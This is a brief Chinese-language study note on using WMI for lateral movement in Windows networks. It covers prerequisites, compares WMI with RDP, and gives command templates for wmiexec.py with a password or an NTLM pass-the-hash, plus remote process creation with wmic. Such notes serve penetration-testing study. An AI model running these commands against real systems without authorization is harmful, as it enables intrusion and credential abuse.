# WMI（Windows Management Instrumentation）

## 介绍

Windwos自带的“远程管理API”

（1）查系统信息

（2）管服务

（3）看进程

（4）远程执行程序

## RDP对比WMI

| 对比     | RDP  | WMI    |
| -------- | ---- | ------ |
| 需要桌面 | 需要 | 不需要 |
| 需要GUI  | 需要 | 不需要 |
| 容易被关 | 容易 | 不容易 |
| 可脚本化 | 一般 | ✔      |

## 使用条件

 1）有目标机器的管理器权限

​	（1）本地管理员

​	（2）域管理员

2）目标机WMI服务开着（默认开）

3）网络能连到目标（RPC相关端口）

没有管理员权限->WMI用不了

## 横向方法

##### Linux->Windows

1）Password

wmiexec.py DOMAIN/user:password@targetIp

2）NTLM Hash

wmiexec.py DOMAIN/user@targetIp -hashes aad3b435b51404eeaad3b435b51404ee:NTLMHASH

##### Windows->Windows

wmic /node:TargetIp process call create "cmd.exe /c whoami"

| 场景           | 首选         |
| -------------- | ------------ |
| 有Hash         | WMI/SMB(PTH) |
| 有明文密码     | WimRM/WMI    |
| 要稳定交互     | WimRM        |
| 快速打一条命令 | WMI          |
| 只读信息       | SMB/LDAP     |

